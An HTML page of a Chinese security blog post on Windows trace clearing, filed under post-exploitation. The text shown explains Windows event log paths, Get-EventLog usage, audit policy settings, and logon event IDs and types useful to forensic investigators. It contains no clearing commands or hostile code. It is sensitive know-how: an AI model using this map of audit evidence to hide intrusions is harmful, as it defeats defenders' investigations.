@@ -1,0 +1,736 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>windows痕迹清除基础 | 小chen妙妙屋</title><meta name="author" content="chen7chen"><meta name="copyright" content="chen7chen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Windows日志简介Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找收到攻击时攻击者留下的痕迹 在渗透测试过程中，Windows日志往往记录系统上的敏感操作，如添加用户、远程登录、执行命令等。攻击者通常会对Windwos日志进行清除和绕过 Windows主要有以下三类日志记录系统文件 系统日志记录操作系统组">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows痕迹清除基础">
+<meta property="og:url" content="http://blog.xchstudy.org/2026/04/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/3%20%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/1%20windows%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="小chen妙妙屋">
+<meta property="og:description" content="Windows日志简介Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找收到攻击时攻击者留下的痕迹 在渗透测试过程中，Windows日志往往记录系统上的敏感操作，如添加用户、远程登录、执行命令等。攻击者通常会对Windwos日志进行清除和绕过 Windows主要有以下三类日志记录系统文件 系统日志记录操作系统组">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.chenjichao.site/raw/3.webp">
+<meta property="article:published_time" content="2026-04-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-03T14:14:40.861Z">
+<meta property="article:author" content="chen7chen">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.chenjichao.site/raw/3.webp"><link rel="shortcut icon" href="/img/output.png"><link rel="canonical" href="http://blog.xchstudy.org/2026/04/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/3%20%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/1%20windows%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4%E5%9F%BA%E7%A1%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'windows痕迹清除基础',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2026-04-03 22:14:40'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/music.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<link rel="stylesheet" href="https://unpkg.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="小chen妙妙屋" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="an_music_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/images.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">218</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">151</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fa-brands fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/#%E5%90%84%E4%BD%8D%E5%B8%88%E5%82%85"><i class="fa-fw fas fa-user-friends"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/link/#%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5"><i class="fa-fw fas fa-laptop-code"></i><span> 技术链接</span></a></div><div class="menus_item"><a class="site-page" href="/message/"><i class="fa-fw fas fa-coffee"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.chenjichao.site/raw/3.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="小chen妙妙屋"><img class="site-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img%5Coutput.png"/><span class="site-name">小chen妙妙屋</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fa-brands fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/#%E5%90%84%E4%BD%8D%E5%B8%88%E5%82%85"><i class="fa-fw fas fa-user-friends"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/link/#%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5"><i class="fa-fw fas fa-laptop-code"></i><span> 技术链接</span></a></div><div class="menus_item"><a class="site-page" href="/message/"><i class="fa-fw fas fa-coffee"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">windows痕迹清除基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-02T16:00:00.000Z" title="发表于 2026-04-03 00:00:00">2026-04-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-03T14:14:40.861Z" title="更新于 2026-04-03 22:14:40">2026-04-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span id="" data-flag-title="windows痕迹清除基础"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>Windows</code>系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找收到攻击时攻击者留下的痕迹</p>
+<p>在渗透测试过程中，<code>Windows</code>日志往往记录系统上的敏感操作，如添加用户、远程登录、执行命令等。攻击者通常会对<code>Windwos</code>日志进行清除和绕过</p>
+<p>Windows主要有以下三类日志记录系统文件</p>
+<h3 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h3><p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等，系统日志中记录的时间类型由<code>Windows NT/2000</code>操作系统预先定义</p>
+<p>默认日志路径：<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
+<h3 id="应用程序日志"><a href="#应用程序日志" class="headerlink" title="应用程序日志"></a>应用程序日志</h3><p>包含由应用程序或者系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序中记录文件错误。程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现程序崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许有助于你解决问题</p>
+<p>默认日志路径：`%SystemRoot%\System32\Winevt\Logs\Application.evtx</p>
+<h3 id="安全日志"><a href="#安全日志" class="headerlink" title="安全日志"></a>安全日志</h3><p>记录系统中的安全审计日志，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、账号管理、策略变更、系统事件。安全日志也是调查取证中常用的日志。默认情况下，安全日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后便系统停止响应</p>
+<p>默认日志路径：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p>
+<p>系统和应用程序日志存储着故障排查信息，对于系统管理员更为有用</p>
+<p>安全日志记录着事件审计信息，包括用户验证和特定用户在认证后对系统做了什么，对于调查人员而言更有意义</p>
+<h2 id="查看系统日志"><a href="#查看系统日志" class="headerlink" title="查看系统日志"></a>查看系统日志</h2><p>进入管理工具、事件管理器查看</p>
+<p>包括五个类别：应用程序、安全、Setup、系统、转发事件</p>
+<h3 id="Powershell获取日志"><a href="#Powershell获取日志" class="headerlink" title="Powershell获取日志"></a>Powershell获取日志</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">|命令                            |功能                      | 范例                                        | </span><br><span class="line">|--------------------------------|--------------------------|---------------------------------------------|</span><br><span class="line">|Get-EventLog                    |取得事件日志              |Get-EventLog -ListList                       |</span><br><span class="line">|   [-LogName] &lt;String&gt;          |设定事件类型              |Get-EventLog System                          |</span><br><span class="line">|   [-ComputerName &lt;String[]&gt;]   |设定电脑名                |Get-EventLog System -ComputerName &quot;localhost&quot;|</span><br><span class="line">|   [-Newest &lt;Int32&gt;]            |设定取得最新事件件数      |Get-EventLog System -Newest 5                |</span><br><span class="line">|   [-After &lt;DateTime&gt;]          |设定取得指定日期之后的事件|Get-EventLog System -After 2020/3/1          |</span><br><span class="line">|   [-Before &lt;DateTime&gt;]         |设定取得指定日期之前的事件|Get-EventLog System -Before 2020/3/1         |</span><br><span class="line">|   [-UserName &lt;String[]&gt;]       |设定取得指定用户的事件    |Get-EventLog System -UserName NT*            |</span><br><span class="line">|   [[-InstanceId] &lt;Int64[]&gt;]    |设定取得指定实例ID的事件  |Get-EventLog System -InstanceId 10016        |</span><br><span class="line">|   [-Index &lt;Int32[]&gt;]           |设定取得指定索引的事件    |Get-EventLog System -Index 13820             |</span><br><span class="line">|   [-EntryType &lt;String[]&gt;]      |设定取得指定错误类型的事件|Get-EventLog System -EntryType Error         |</span><br><span class="line">|   [-Source &lt;String[]&gt;]         |设定取得指定事件来源的事件|Get-EventLog System -Source Outlook          |</span><br><span class="line">|   [-Message &lt;String&gt;]          |设定取得指定事件信息的事件|Get-EventLog System -Message *failed*        |</span><br><span class="line">|   [-AsBaseObject]              |设定取得指定基本对象的事件|Get-EventLog System -AsBaseObject            |</span><br><span class="line">|   [&lt;CommonParameters&gt;]         |设定通用参数              |Get-EventLog System -Format List             |</span><br></pre></td></tr></table></figure>
+<h2 id="审核策略与事件查看器"><a href="#审核策略与事件查看器" class="headerlink" title="审核策略与事件查看器"></a>审核策略与事件查看器</h2><p><code>Windows Server 2008 R2</code>系统的审核功能在默认状态下并没有启动，建议开启审核策略，若日后系统出现故障，安全事故则可以查看系统的日志文件，排查故障，追查入侵者的信息等</p>
+<p>设置1：<code>WIN+R</code>输入<code>secpol.msc</code>打开本地安全策略-&gt;本地策略-&gt;策略审核</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">推荐操作：</span><br><span class="line">审核</span><br></pre></td></tr></table></figure>
+<p>问题：设置完审核策略后，执行<code>gpupdate /force</code>，更新组策略，导致策略自动消失</p>
+<p>解决方案：删除 <code>C:\Windows\System32\GroupPolicy\Machine\Microsoft\Windows NT\Audit</code>文件下的<code>.csv</code>文件</p>
+<p>设置2：<code>Win+R</code>，输入<code>eventvwr.msc</code>进入事件查看器，设置合理的日志属性，即日志最大大小、事件覆盖阈值等</p>
+<h2 id="常见登录事件日志分析"><a href="#常见登录事件日志分析" class="headerlink" title="常见登录事件日志分析"></a>常见登录事件日志分析</h2><p>对于Windows事件日志分析，不同的<code>EVENT ID</code>代表了不同的意义</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>事件ID</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4624</td>
+<td>登录成功</td>
+</tr>
+<tr>
+<td>4625</td>
+<td>登录失败</td>
+</tr>
+<tr>
+<td>4634</td>
+<td>注销成功</td>
+</tr>
+<tr>
+<td>4637</td>
+<td>用户启动的注销</td>
+</tr>
+<tr>
+<td>4672</td>
+<td>使用超级用户进行登录</td>
+</tr>
+<tr>
+<td>4720</td>
+<td>创建用户</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="登录类型"><a href="#登录类型" class="headerlink" title="登录类型"></a>登录类型</h3><p>每个成功登录的事件都会标记一个登录类型，不同的登录类型代表不同的方式：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>登录类型</th>
+<th>描述</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2</td>
+<td>交互式登录</td>
+<td>用户在计算机的控制台上进行的登录，也就是在本地键盘上进行的登录，但不要忘记通过KVM登录仍然属于交互式登录，虽然它是基于网络的。</td>
+</tr>
+<tr>
+<td>3</td>
+<td>网络</td>
+<td>当你从网络的上访问一台计算机时在大多数情况下Windows记为类型3，最常见的情况就是连接到共享文件夹或者共享打印机时。另外大多数情况下通过网络登录IIS时也被记为这种类型</td>
+</tr>
+<tr>
+<td>4</td>
+<td>批处理</td>
+<td>“计划任务服务”将为这个任务首先创建一个新的登录会话以便它能在此计划任务所配置的用户账户下运行，当这种登录出现时，Windows在日志中记为类型4，对于其它类型的工作任务系统，依赖于它的设计，也可以在开始工作时产生类型4的登录事件，类型4登录通常表明某计划任务启动，但也可能是 一个恶意用户通过计划任务来猜测用户密码，这种尝试将产生一个类型4的登录失败事件，但是这种失败登录也可能是由于计划任务的用户密码没能同步更改造成的，比如用户密码更改了，而忘记了在计划任务中进行更改。</td>
+</tr>
+<tr>
+<td>5</td>
+<td>服务</td>
+<td>每种服务都被配置在某个特定的用户账户下运行，当一个服务开始时，Windows首先为这个特定的用户创建一个登录会话，这将被记为类型5，失败的类型5通常表明用户的密码已变而这里没得到更新，当然这也可能是由恶意用户的密码猜测引起的，但是这种可能性比较小，因为创建一个新的服务或编辑一个已存在的服务默认情况下都要求是管理员或serversoperators身份，而这种身份的恶意用户，已经有足够的能力来干他的坏事了，已经用不着费力来猜测服务密码了。</td>
+</tr>
+<tr>
+<td>7</td>
+<td>解锁</td>
+<td>当一个用户离开他的计算机时相应的工作站自动开始一个密码保护的屏保，当一个用户回来解锁时，Windows就把这种解锁操作认为是一个类型7的登录，失败的类型7登录表明有人输入了错误的密码或者有人在尝试解锁计算机。</td>
+</tr>
+<tr>
+<td>8</td>
+<td>网络明文</td>
+<td>但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，据我所知只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。</td>
+</tr>
+<tr>
+<td>9</td>
+<td>新凭证</td>
+<td>当你使用带/Netonly参数的RUNAS命令运行一个程序时，RUNAS以本地当前登录用户运行它，但如果这个程序需要连接到网络上的其它计算机时，这时就将以RUNAS命令中指定的用户进行连接，同时Windows将把这种登录记为类型9，如果RUNAS命令没带/Netonly参数，那么这个程序就将以指定的用户运行，但日志中的登录类型是2。</td>
+</tr>
+<tr>
+<td>10</td>
+<td>远程交互</td>
+<td>当你通过终端服务、远程桌面或远程协助访问计算机时，Windows将记为类型10，以便与真正的控制台登录相区别，注意XP之前的版本不支持这种登录类型，比如Windows2000仍然会把终端服务登录记为类型2。</td>
+</tr>
+<tr>
+<td>11</td>
+<td>缓存交互</td>
+<td>Windows支持一种称为缓存登录的功能，这种功能对移动用户尤其有利，比如你在自己网络之外以域用户登录而无法登录域控制器时就将使用这种功能，默认情况下，Windows缓存了最近10次交互式域登录的凭证HASH，如果以后当你以一个域用户登录而又没有域控制器可用时，Windows将使用这些HASH来验证你的身份。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="特殊字段"><a href="#特殊字段" class="headerlink" title="特殊字段"></a>特殊字段</h3><p>当你双击一个 <code>4624</code> 或 <code>4625</code> 事件时，除了 Logon Type，还需要关注以下字段：</p>
+<ul>
+<li><strong>Subject (主题)：</strong> 报告此事件的账户（通常是系统本身如 <code>SYSTEM</code>）。</li>
+<li><strong>New Logon / Account Whose Credentials Were Used (新登录/目标账户)：</strong> 实际尝试登录的用户名。</li>
+<li><strong>Failure Reason (失败原因)：</strong> 仅存在于 4625 中。<ul>
+<li><code>%%2313</code> (0xC000006A) - 密码错误。</li>
+<li><code>%%2314</code> (0xC0000064) - 用户名不存在。</li>
+<li><code>%%2308</code> (0xC0000234) - 账户被锁定。</li>
+</ul>
+</li>
+<li><strong>Network Information (网络信息)：</strong><ul>
+<li><strong>Workstation Name (工作站名称)：</strong> 发起登录请求的机器名。</li>
+<li><strong>Source Network Address (源网络地址)：</strong> 发起登录请求的源 IP 地址。（如果是本地登录 Type 2，此处可能显示 <code>127.0.0.1</code> 或 <code>-</code>）。</li>
+</ul>
+</li>
+</ul>
+<h2 id="常见情况"><a href="#常见情况" class="headerlink" title="常见情况"></a>常见情况</h2><h3 id="1-本地物理机器登录（打卡上班-接触物理机）"><a href="#1-本地物理机器登录（打卡上班-接触物理机）" class="headerlink" title="1. 本地物理机器登录（打卡上班 / 接触物理机）"></a>1. 本地物理机器登录（打卡上班 / 接触物理机）</h3><p>这是最基础的登录方式，用户坐在电脑前，通过键盘输入密码进入系统。</p>
+<ul>
+<li><strong>用户动作：</strong> 开机后在登录界面输入正确的账号密码。</li>
+<li><strong>产生的核心日志：</strong><ul>
+<li><strong>Event ID 4624 (登录成功)</strong>，且 <strong>Logon Type 为 2 (交互式)</strong>。</li>
+<li><strong>Event ID 4672 (特殊特权分配)</strong>：如果该用户是管理员组的成员，会紧跟着产生此日志，表明该会话获得了管理员级别的特权（如 <code>SeDebugPrivilege</code>）。</li>
+</ul>
+</li>
+<li><strong>取证意义：</strong> 用于证明在某个特定时间点，有人在物理层面接触并解锁了该设备。如果在凌晨 3 点出现了 Type 2 的登录，且不是门卫/夜班人员，通常意味着物理安全被突破。</li>
+</ul>
+<h3 id="2-通过-RDP-远程桌面连接（远程办公-外部入侵）"><a href="#2-通过-RDP-远程桌面连接（远程办公-外部入侵）" class="headerlink" title="2. 通过 RDP 远程桌面连接（远程办公 / 外部入侵）"></a>2. 通过 RDP 远程桌面连接（远程办公 / 外部入侵）</h3><p>用户通过 <code>mstsc.exe</code> 或其他远程桌面工具连接到目标机器。</p>
+<ul>
+<li><strong>用户动作：</strong> 发起 RDP 连接并输入凭据。</li>
+<li><strong>产生的核心日志：</strong><ul>
+<li><strong>Event ID 4624 (登录成功)</strong>，且 <strong>Logon Type 为 10 (远程交互)</strong>。日志详情中的“源网络地址 (Source Network Address)”会记录发起连接的真实 IP。</li>
+<li><strong>Event ID 4778 (会话重新连接)</strong>：如果用户之前没有注销，只是直接关掉了 RDP 窗口（断开连接），再次通过 RDP 连回去时，会产生此日志。</li>
+<li><strong>Event ID 4779 (会话断开)</strong>：用户直接点击“X”关闭 RDP 窗口，而不是点“注销”时产生。</li>
+</ul>
+</li>
